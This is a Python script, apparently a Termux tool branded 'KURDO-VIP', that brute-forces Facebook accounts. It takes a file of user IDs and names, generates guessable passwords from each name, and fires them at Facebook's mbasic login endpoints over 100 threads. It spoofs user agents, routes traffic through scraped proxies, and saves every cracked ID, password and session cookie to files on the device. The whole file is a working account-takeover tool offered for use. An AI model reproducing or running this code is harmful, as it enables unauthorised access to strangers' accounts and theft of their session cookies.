
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import requests
cookies = {
    'datr': 'iZ2xY04E3jAca46uaLOJLWbL',
    'sb': 'iZ2xYyI7oe2HAXvfOpqjNV2N',
    'locale': 'fa_IR',
    'vpd': 'v1%3B737x393x2.75',
    'wd': '393x737',
    'fr': '03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
}

headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=iZ2xY04E3jAca46uaLOJLWbL; sb=iZ2xYyI7oe2HAXvfOpqjNV2N; locale=fa_IR; vpd=v1%3B737x393x2.75; wd=393x737; fr=03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
}

params = {
    'refid': '8',
}

data = {
    'lsd': 'AVqAhQPrMiI',
    'jazoest': '2963',
    'uid': '100076526146833',
    'flow': 'login_no_pin',
    'next': '',
}

response = requests.post(
    'https://mbasic.facebook.com/login/device-based/validate-pin/',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#DATE AND TIME
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96mDynoXD')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
#PROXYGEN
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
		
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#COLOR-CODE
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,O,h,u,b])

okc = 'X-FILE-OK-'+str(ta)+'.txt'
cpc = 'X-FILE-CP-'+str(ta)+'.txt'

def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"
#IPYTHONI
def _____DYNO_____(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008','10009','100010','100011','100012']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
def clear():
	os.system('clear')
def back():
	login()
#LOGO
def banner():
	print("""\x1b[1;92m 
 ─────▄───▄
─▄█▄─█▀█▀█─▄█▄
▀▀████▄█▄████▀▀
─────▀█▀█▀

██╗░░██╗██╗░░░██╗██████╗░██████╗░░█████╗░
██║░██╔╝██║░░░██║██╔══██╗██╔══██╗██╔══██╗
█████═╝░██║░░░██║██████╔╝██║░░██║██║░░██║
██╔═██╗░██║░░░██║██╔══██╗██║░░██║██║░░██║
██║░╚██╗╚██████╔╝██║░░██║██████╔╝╚█████╔╝
╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═════╝░░╚════╝░
\x1b[1;92m｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡\x1b[1;91m
𝔸𝕌𝕋ℍ𝕆ℝ ➙    𝐊??𝐑𝐃𝐎-𝐕𝐈𝐏✌️
ℂℍ𝔸ℕ𝔼𝕃 ➙    https://t.me/Team_1779
𝕋𝔼𝕃𝔼𝔾ℝ𝔸𝕄 ➙  @kurdo_CRAKER
𝕍𝔼ℝ𝕊𝕀𝕆ℕ ➙   1.7
\x1b[1;92m｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡\x1b[1;91m
 ➙ 𝐁𝐚𝐬𝐡𝐭𝐫𝐞𝐧 𝐭𝐨𝐨𝐥𝐞 𝐂𝐫𝐚𝐜𝐤𝐞 𝐤𝐮𝐫𝐝 🦁
 ➙ 𝐒𝐞𝐬𝐭𝐚𝐦𝐮 𝐁𝐲𝐩𝐚𝐬𝐬𝐞 𝐭𝐨 𝐧𝐚𝐭𝐰𝐚𝐧𝐧 𝐬𝐞𝐬𝐭𝐚𝐦𝐮 𝐞𝐦𝐚 𝐭𝐞𝐛𝐩𝐚𝐫𝐞𝐧𝐢🖤
 ➙ 𝐊𝐔𝐑𝐃𝐎 𝐃𝐫𝐰𝐬𝐭𝐚𝐤𝐫𝐢 𝐭𝐨𝐨𝐥𝐚 𝐰 𝐛𝐳𝐡𝐢 𝐤𝐮𝐫𝐝 𝐮 𝐤𝐮𝐫𝐝𝐢𝐬𝐭𝐚𝐧✌️👿
\x1b[1;92m｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
""")
os.system('clear')
banner()
#MENU
def menu():
	
	print(f'\x1b[1;92m𝟏- 𝐂𝐑𝐀𝐂𝐊 𝐖𝐈𝐓𝐇 𝐅𝐈𝐋𝐄📁☠️')
	_____DYNO_____ = input('SELECT : ')
	if _____DYNO_____ in ['1']:
		F()
		print(' \x1b[1;91m\x1b[1;96m{H} LogOut Successful ')
		exit()
	else:
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m NOT SELECT ')
		back()
def error():
	print(f' \x1b[1;91m\x1b[1;96m{H} \x1b[1;91mBgarewa Bo Menu')
	time.sleep(2)
	back()
#INPUT-FILE	
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			
			fileX = input ('𝐊𝐔𝐑𝐃𝐎-𝐕𝐈𝐏 ☠️ 𝐅𝐈𝐋𝐄 𝐍𝐀𝐌𝐄📁 : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;93mCOLECTED ID : \x1b[1;93m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;91m\x1b[1;96m{H} \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#SERVER-SETTING			
def Settings():
	print('')
	print('\x1b[1;93mRANDOM IDS ')
	print('')
	hu = "1"
	if hu in ['2','02']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['1','1']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['111','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\x1b[1;91m\x1b[1;96m{H}\x1b[1;91mNOT SELECT')
		exit()
	
	print('\x1b[1;93mMETHODE MOBILE')
	print('')
	hc = "1"
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus= "t"
	if pwplus in ['00','00']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] ENTER 6 CHARECTERS FOR CRACK PASS\n[[cyan]•[white]] LIKE --->[green] zaxo123,kurd123,hama1234[white] '))
		pwku=input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPassword > \x1b[1;93m')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	BB()
	exit()
def BB():
    os.system('clear')
    banner()
    passwrd()
def passwrd():
	print(f"{H}"+100*"=")
	print(f"\x1b[1;91m 𝐃𝐀𝐓𝐄 : {H}{ha}{H}/{H}{bu}{H}/{H}{ta}\n𝐂𝐇𝐀𝐖𝐀𝐑 𝐖𝐀𝐍𝐁𝐀 : "+str(len(id))+"\n𝐁𝐳𝐡𝐢 𝐊𝐔𝐑𝐃𝐎-𝐕𝐈𝐏☠️👿 ")
	print(f"{H}"+100*"="+"\n")
	with tred(max_workers=100) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+"123")
					pwv.append(frs+"1234")
					pwv.append(frs+"@1234")
					pwv.append(frs+"123456")
					pwv.append(frs+"@123")
					pwv.append(frs+"2001")
					pwv.append(frs+"2002")
					pwv.append(frs+"2003")
					pwv.append(frs+"2004")
					pwv.append(frs+"2005")
					pwv.append(frs+"2006")
					pwv.append(frs+"2007")
					pwv.append(frs+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+"123")
					pwv.append(frs+"1234")
					pwv.append(frs+"@1234")
					pwv.append(frs+"123456")
					pwv.append(frs+"@123")
					pwv.append(frs+"2001")
					pwv.append(frs+"2002")
					pwv.append(frs+"2003")
					pwv.append(frs+"2004")
					pwv.append(frs+"2005")
					pwv.append(frs+"2006")
					pwv.append(frs+"2007")
					pwv.append(frs+frs)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f'\n{x}GOOD : {H}%s '%(ok))
	print(f'{x}CP : {m}%s '%(cp))
	print('Crack ( Y/t ) ? ')
	woi = input('{H} SELECT  : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \x1b[1;91m\x1b[1;96m{H} BYE {u} ')
		time.sleep(2)
		exit()

def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{x}[{H}𝐊𝐔𝐑𝐃𝐎-𝐕𝐈𝐏{x}]{loop}{U}|{H}{ok}"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\r\n{x}[ {m}  - 𝐊𝐔𝐑𝐃𝐎-𝐕𝐈𝐏✌️-𝐂𝐏 {x}]\n{m}YEAR-FB{x}:{m} {tahun(idf)}\n{m}UID{x}:{m} {idf}\n{m}PASS{x}:{m} {pw}\n{m}COOKIES{x}:{m} {kuki} ')
				open('/sdcard/𝐊𝐔𝐑𝐃𝐎-𝐕𝐈𝐏 FILE/'+cpc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r\r\n{x}[ {H}  - 𝐊𝐔𝐑𝐃𝐎-𝐕𝐈𝐏✌️-𝐎𝐊 {x}]\n{H}YEAR-FB{x}:{H} {tahun(idf)}\n{H}UID{x}:{H} {idf}\n{H}PASS{x}:{H} {pw}\n{H}COOKIES{x}:{H} {kuki} ')
				open('/sdcard/Kurdo FILE/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
#				cek_apk(kuki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

def cek_opsi():
	c = len(akun)
	hu = '#'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] INPUT')
	cek = '# PROSESES CO'
	sol().print(mark(cek, style='pink'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ERROR=-     %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> ERROR       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '#INTERNET NO CONNECTED'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='pink'))
	exit()
	
def chek():
    os.system('clear')
    banner()
    menu()



if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/kurdo FILE')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	chek()